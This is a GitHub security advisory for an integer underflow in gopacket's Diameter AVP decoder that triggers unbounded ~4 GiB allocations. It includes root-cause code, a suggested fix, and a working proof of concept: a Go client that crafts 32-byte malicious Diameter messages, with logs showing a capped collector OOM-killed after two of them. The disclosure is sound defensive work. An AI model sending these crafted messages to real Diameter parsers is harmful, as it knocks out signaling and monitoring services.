# [M] GoPacket's Diameter AVP decoder: uint32 underflow on vendor header size leads to unbounded ~4 GiB allocation (unauthenticated remote DoS)

## Summary
Severity: Medium
Advisory: GHSA-6r28-9ppf-4hj5
CVE: CVE-2026-54345
CWE: CWE-191, CWE-770
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-07-28
Source: https://github.com/advisories/GHSA-6r28-9ppf-4hj5
Type: github-advisory

## Affected
- Go: `github.com/gopacket/gopacket` — affected >=0 <1.6.1

## Details
## Summary

The Diameter AVP decoder in `github.com/gopacket/gopacket` computes `dataLength := avp.Length - uint32(headerSize)` without first ensuring `avp.Length >= headerSize`. When the Vendor flag is set, `headerSize` is 12, but the only length guard upstream rejects `avp.Length < 8`. An AVP with the Vendor flag set and a 24-bit Length field of 8, 9, 10, or 11 therefore underflows the `uint32` subtraction to ~4,294,967,292, which is passed straight to `make([]byte, dataLength)`. A single 32-byte Diameter message forces a ~4 GiB allocation; a short burst of such messages exhausts memory and OOM-kills memory-constrained collectors. This is an unauthenticated remote denial of service (CWE-191 integer underflow -> CWE-770 unbounded allocation).

## Root cause (file:line @ v1.6.0)

`layers/diameter_avp_decoders.go`, `decodeDiameterAVP`:

```go
avp.Length = uint32(data[5])<<16 | uint32(data[6])<<8 | uint32(data[7]) // 24-bit wire value

if avp.Length < 8 {                       // only rejects < 8
    return DiameterAVP{}, 0, fmt.Errorf("invalid AVP length: %d", avp.Length)
}

headerSize := 8
dataOffset := 8
if avp.Flags.Vendor {                     // Vendor flag = wire bit data[4] & 0x80
    if len(data) < 12 { ... }
    avp.VendorID = binary.BigEndian.Uint32(data[8:12])
    headerSize = 12                       // header is now 12, but only >= 8 was checked
    dataOffset = 12
}

paddedLength := avp.Length                // equals avp.Length; for avp.Length <= 12
if avp.Length%4 != 0 { paddedLength = avp.Length + (4 - avp.Length%4) }
if uint32(len(data)) < paddedLength {     // only requires ~12 bytes present
    return DiameterAVP{}, 0, fmt.Errorf("AVP data truncated: ...")
}

dataLength := avp.Length - uint32(headerSize)  // 8 - 12 = uint32 underflow = 4294967292
avp.Data = make([]byte, dataLength)            // make([]byte, ~4.29e9) ~= 4 GiB
copy(avp.Data, data[dataOffset:dataOffset+int(dataLength)])  // out-of-bounds slice -> panic
```

For `avp.Length` in `{8, 9, 10, 11}` with the Vendor flag set: the `avp.Length < 8` guard passes, `paddedLength == avp.Length` so only `avp.Length` bytes must be present, and `dataLength = avp.Length - 12` underflows the `uint32`. The allocation size is determined entirely by the attacker-supplied 3-byte Length field plus a single flag bit. The `make` executes before the `copy`, so the multi-gigabyte allocation is requested regardless of whether the copy later panics.

## Reachability (remote attacker -> sink)

`LayerTypeDiameter` is a registered decoder (`layertypes.go:159`, `RegisterLayerType(154, ... decodeDiameter)`):

`decodeDiameter` -> `(*Diameter).DecodeFromBytes` (diameter.go:118) -> parses the 20-byte header -> `avpData := data[20:d.MessageLength]` -> AVP loop `decodeDiameterAVP(avpData)` (diameter.go:158) -> sink at `diameter_avp_decoders.go:57`.

Diameter (RFC 6733) is a TCP/SCTP base protocol used for AAA and telecom/5G signaling. Any service that parses Diameter with gopacket (packet collectors, signaling monitors, IDS/analysis tooling) processes attacker-sent or attacker-forwarded Diameter messages with no authentication involved, so any host able to deliver such a message to the parser reaches the sink. The same path is reached via `gopacket.NewPacket(data, LayerTypeDiameter, ...)`. The Diameter layer is specific to this gopacket fork (the original google/gopacket has no Diameter layer), so there is no upstream sibling fix.

## Impact

Unauthenticated remote denial of service via memory exhaustion. Each malicious 32-byte Diameter message requests a ~4 GiB allocation (amplification ~1.34e8x over the input). There is no memory corruption and no code execution -- the impact is resource exhaustion / process termination. Severity assessed as Medium (unauthenticated remote DoS, no memory-safety violation).

Note on consumer behavior (measured end-to-end against a deployed collector, see PoC):

- A collector using the recovering `gopacket.NewPacket(..., gopacket.Default)` API survives a *single* malicious message: the ~4 GiB `make([]byte, dataLength)` runs (in-process `runtime.MemStats` shows a 4096 MB `TotalAlloc` delta per message), but the immediately-following out-of-bounds `copy` panics before the allocator faults in the 4 GiB of physical pages, the panic is recovered into an `ErrorLayer`, and the reservation is reclaimed by the GC. RSS therefore does not commit on a single message.
- **Two malicious messages in succession reliably OOM-kill the collector** under a 256 MB cap: the second `make` commits physical pages before the first reservation is fully returned to the cgroup, and the kernel cgroup OOM-killer terminates the process (`OOMKilled=true`, exit 137). This was reproduced with two messages sent strictly serially to the single-threaded accept loop (no concurrency required).
- Consumers that call `DecodeFromBytes` directly (common in performance-sensitive collectors) or set `SkipDecodeRecovery: true` additionally get an uncaught panic / crash on the first message.

In all cases the underlying defect is the same unbounded ~4 GiB allocation driven by an attacker-controlled field; the only variable is how many messages it takes to exhaust a given memory limit.

## Proof of Concept

This PoC is an end-to-end test against a real deployed Diameter collector. A minimal but realistic TCP collector (built on the public gopacket API) runs inside a hard-capped 256 MB container; an independent client process sends real malicious Diameter messages over a real TCP socket; the collector process is then observed to die. A benign message is used as a negative control. The harness pins `github.com/gopacket/gopacket@v1.6.0` (the sink is confirmed at the v1.6.0 tag, `layers/diameter_avp_decoders.go:56-58`).

### Collector (real TCP Diameter collector)

```go
// collector.go — accepts a TCP connection, reads one Diameter message (framed by
// the 24-bit Message Length in the base header), builds a gopacket.Packet rooted
// at LayerTypeDiameter and accesses the layer, which drives the registered
// Diameter decoder over the attacker-controlled bytes.
package main

import (
	"fmt"
	"io"
	"net"
	"os"

	"github.com/gopacket/gopacket"
	"github.com/gopacket/gopacket/layers"
)

func readDiameterMessage(conn net.Conn) ([]byte, error) {
	hdr := make([]byte, 20)
	if _, err := io.ReadFull(conn, hdr); err != nil {
		return nil, err
	}
	msgLen := uint32(hdr[1])<<16 | uint32(hdr[2])<<8 | uint32(hdr[3])
	if msgLen < 20 {
		return hdr, nil
	}
	full := make([]byte, msgLen)
	copy(full, hdr)
	if _, err := io.ReadFull(conn, full[20:]); err != nil {
		return nil, err
	}
	return full, nil
}

func main() {
	ln, err := net.Listen("tcp", "0.0.0.0:3868")
	if err != nil {
		fmt.Fprintf(os.Stderr, "listen error: %v\n", err)
		os.Exit(1)
	}
	defer ln.Close()
	fmt.Printf("[collector] Diameter collector listening on tcp %s\n", ln.Addr())
	for {
		conn, err := ln.Accept()
		if err != nil {
			continue
		}
		func() {
			defer conn.Close()
			data, err := readDiameterMessage(conn)
			if err != nil {
				return
			}
			fmt.Printf("[collector] received %d-byte Diameter message from %s\n", len(data), conn.RemoteAddr())
			pkt := gopacket.NewPacket(data, layers.LayerTypeDiameter, gopacket.Default)
			if d, ok := pkt.Layer(layers.LayerTypeDiameter).(*layers.Diameter); ok {
				fmt.Printf("[collector] decoded Diameter: version=%d cmd=%d msgLen=%d avps=%d\n",
					d.Version, d.CommandCode, d.MessageLength, len(d.AVPs))
			} else {
				fmt.Printf("[collector] no Diameter layer decoded\n")
			}
		}()
	}
}
```

### Client (independent process, real TCP socket, no gopacket dependency)

The client crafts a 20-byte Diameter base header followed by one vendor AVP whose 24-bit Length is `avpLen`. With the Vendor flag set, the decoder's `headerSize` becomes 12; for `avpLen` in `{8,9,10,11}` the `dataLength = avpLen - 12` subtraction underflows. For the benign case `avpLen >= 12` so the AVP carries `avpLen-12` real bytes and parses cleanly.

```go
// client.go — usage: client <addr> <avpLen> [--benign]
package main

import (
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"strconv"
	"time"
)

func be32(v uint32) []byte { b := make([]byte, 4); binary.BigEndian.PutUint32(b, v); return b }

func craft(avpLen uint32, benign bool) []byte {
	avp := []byte{}
	avp = append(avp, be32(1)...) // AVP Code = 1
	avp = append(avp, 0x80)       // Flags: Vendor bit set -> headerSize becomes 12
	avp = append(avp, byte(avpLen>>16), byte(avpLen>>8), byte(avpLen)) // 24-bit Length
	avp = append(avp, be32(0)...) // VendorID
	if benign {
		dataLen := int(avpLen) - 12
		if dataLen < 0 {
			dataLen = 0
		}
		padded := dataLen
		if padded%4 != 0 {
			padded += 4 - padded%4
		}
		for i := 0; i < padded; i++ {
			avp = append(avp, 0x42)
		}
	} else {
		for len(avp) < 12 {
			avp = append(avp, 0x00)
		}
	}
	msgLen := uint32(20 + len(avp))
	hdr := make([]byte, 20)
	hdr[0] = 0x01 // Version 1
	hdr[1] = byte(msgLen >> 16)
	hdr[2] = byte(msgLen >> 8)
	hdr[3] = byte(msgLen)
	hdr[4] = 0x80 // Command Flags: Request
	hdr[5], hdr[6], hdr[7] = 0x00, 0x01, 0x01 // CommandCode 257
	return append(hdr, avp...)
}

func main() {
	addr := os.Args[1]
	avpLen, _ := strconv.ParseUint(os.Args[2], 10, 32)
	benign := len(os.Args) > 3 && os.Args[3] == "--benign"
	data := craft(uint32(avpLen), benign)
	conn, err := net.Dial("tcp", addr)
	if err != nil {
		fmt.Fprintf(os.Stderr, "dial error: %v\n", err)
		os.Exit(1)
	}
	defer conn.Close()
	conn.Write(data)
	fmt.Printf("[client] sent %d-byte Diameter message (avpLen=%d, vendor, benign=%v)\n",
		len(data), avpLen, benign)
	buf := make([]byte, 1)
	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
	conn.Read(buf)
}
```

### Run and observed result

The collector runs under a hard 256 MB cgroup cap with swap disabled (`--memory=256m --memory-swap=256m`) so the OOM is contained to the cgroup and the host is unaffected.

Negative control (benign message, vendor AVP `Length=16`, `dataLength=4`):

```
$ docker run --rm --network diam-net diameter-client-e2e diam-e2e:3868 16 --benign
[client] sent 36-byte Diameter message (avpLen=16, vendor, benign=true)

# collector log:
[collector] received 36-byte Diameter message from 172.19.0.3:53216
[collector] decoded Diameter: version=1 cmd=257 msgLen=36 avps=1
# collector status: running (ALIVE); RSS flat at 1.5 MiB
```

Attack message #1 (malicious, vendor AVP `Length=8` -> `8-12` underflow -> ~4 GiB make):

```
$ docker run --rm --network diam-net diameter-client-e2e diam-e2e:3868 8
[client] this AVP makes dataLength = 8 - 12 = 4294967292 (uint32 underflow) -> make([]byte, 4294967292) ~= 4.00 GiB
[client] message sent over real TCP socket

# collector log:
[collector] received 32-byte Diameter message from 172.19.0.3:53230
[collector] no Diameter layer decoded
# collector status after #1: running (the single ~4 GiB make panics on the
# subsequent out-of-bounds copy and is recovered before physical pages commit);
# RSS 6.5 MiB
```

Attack message #2 (same malicious message again):

```
$ docker run --rm --network diam-net diameter-client-e2e diam-e2e:3868 8
[client] this AVP makes dataLength = 8 - 12 = 4294967292 (uint32 underflow) -> make([]byte, 4294967292) ~= 4.00 GiB
[client] message sent over real TCP socket

# container final state:
Status=exited OOMKilled=true ExitCode=137
```

Two malicious 32-byte Diameter messages, delivered over a real TCP socket to a real gopacket-based collector, terminate the collector process: the kernel cgroup OOM-killer fires (`OOMKilled=true`, exit 137). A single message is recovered by the default decoding API and the process survives, but the second `make([]byte, 4294967292)` commits before the first reservation is reclaimed and exhausts the 256 MB limit. This was reproduced with the two messages sent strictly serially (no concurrency). The benign control on the same collector decodes cleanly and the process stays alive with flat RSS, confirming the attacker-controlled AVP Length underflow is what drives the allocation.

In-process measurement confirms the per-message allocation: feeding the same 32-byte message through `gopacket.NewPacket(..., gopacket.Default)` shows a `runtime.MemStats` `TotalAlloc` delta of 4096 MB, i.e. the `make([]byte, 4294967292)` genuinely executes on every message before the copy panics.

The host is unaffected throughout: the allocation is contained by the 256 MB cgroup cap (no swap), and host swap stayed above 900 MB free across the run.

## Affected versions

`github.com/gopacket/gopacket` <= v1.6.0 (v1.6.0 is the latest release; the sink is present at the v1.6.0 tag). The Diameter layer is specific to this module.

## Suggested fix

After `headerSize` is finalized (i.e. after the Vendor-flag branch), reject any AVP whose declared Length cannot cover its own header, before computing `dataLength`:

```go
if avp.Length < uint32(headerSize) {
    return DiameterAVP{}, 0, fmt.Errorf("invalid AVP length: %d, smaller than header size %d", avp.Length, headerSize)
}
```

This mirrors the existing `avp.Length < 8` check but accounts for the 12-byte vendor header, eliminating the underflow and capping the allocation at the real data size. With this guard the upstream `go test ./layers -run Diameter` suite (9 tests) still passes and valid vendor AVPs parse unchanged.

## References
- https://github.com/gopacket/gopacket/security/advisories/GHSA-6r28-9ppf-4hj5
- https://github.com/gopacket/gopacket/commit/145859d0eaee1a6f5925ffb93851c976449c3311
- https://github.com/gopacket/gopacket
- https://github.com/gopacket/gopacket/releases/tag/v1.6.1
